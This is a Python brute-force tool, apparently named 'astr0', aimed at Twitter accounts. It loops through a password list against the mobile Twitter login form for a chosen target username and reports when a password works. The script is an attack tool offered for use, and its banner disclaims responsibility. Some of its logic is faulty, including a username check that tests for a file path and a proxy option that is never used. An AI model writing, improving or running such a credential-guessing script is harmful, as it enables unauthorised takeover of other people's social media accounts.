from time import sleep
import mechanize
import sys, os, argparse

print('''\033[1;36m

    .'``.``.
 __/ (o) `, `.
'-=`,     ;   `.
    \    :      `-.
    /    ';        `.
   /      .'         `.
   |     (      `.     `-.._
    \     \` ` `. \         `-.._
     `.   ;`-.._ `-`._.-. `-._   `-._
       `..'     `-.```.  `-._ `-.._.'
         `--..__..-`--'      `-.,'
            `._)`/
             /--(
          -./,--'`-,
       ,^--(                    
       ,--' `-,         
        ******************************************
        * > astr0 v1.0 Twitter brute-force       *
        * > Code                                 *
        * > Twitter: @strixnull                  *
        * > I am not responsible for your action *
        ******************************************                                                    
\033[1;m''')

parser = argparse.ArgumentParser(description="[==] This simple script to penetrate accounts Twitter brute-force")
parser.add_argument('-u', required=True, default=None, help='Target username.')
parser.add_argument('-p', required=True, default=None, help='Password list / Path of password file.')
parser.add_argument('-d', required=False, default=0, help='Delay seconds for new request.', type=int)
parser.add_argument('-proxy', required=False, default=0, help='Proxy list / Path of Proxy list file.', type=int)
args = vars(parser.parse_args())

b = mechanize.Browser()
b.set_handle_equiv(True)
b.set_handle_gzip(True)
b.set_handle_redirect(True)
b.set_handle_referer(True)
b.set_handle_robots(False)
b._factory.is_html = True
b.addheaders = [('User-agent',
                 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]

username = args['u']
passwordList = args['p']
delay = args['d']
proxyList = args['proxy']

if os.path.exists(args['p']) == False:
    sys.exit("Arquivo de senha não existe!")
elif os.path.exists(args['u']) == True:
    sys.exit('Usuário não definido!')

def Twitter():
    password = open(passwordList).read().splitlines()
    try_login = 0
    print("Target Account: {}".format(username))
    for password in password:
        try_login += 1
        if try_login == 10:
            try_login = 0
        sys.stdout.write(f'\r[+] {password} [+] ')
        sys.stdout.flush()
        url = "https://mobile.twitter.com/login"

        try:
            sleep(delay)
            response = b.open(url, timeout=3)
            b.select_form(nr=0)

            b.form['session[username_or_email]'] = username
            b.form['session[password]'] = password

            b.method = "GET"
            response = b.submit()
            #print(response.geturl()) #Esses dois comentários são para debugar o script
            #print(len(response.geturl()))

            if len(response.geturl()) == 27:
                print(f'\n[+] PASSWORD FOUND [{username}]:[{password}] [+]')
                break
            else:
                print('\n   PASSWORD NOT FOUND!')
        except KeyboardInterrupt:
            print('\n<<< FIM DO PROGRAMA >>>')

            sys.stdout.flush()
            break
if __name__ == '__main__':
    Twitter()
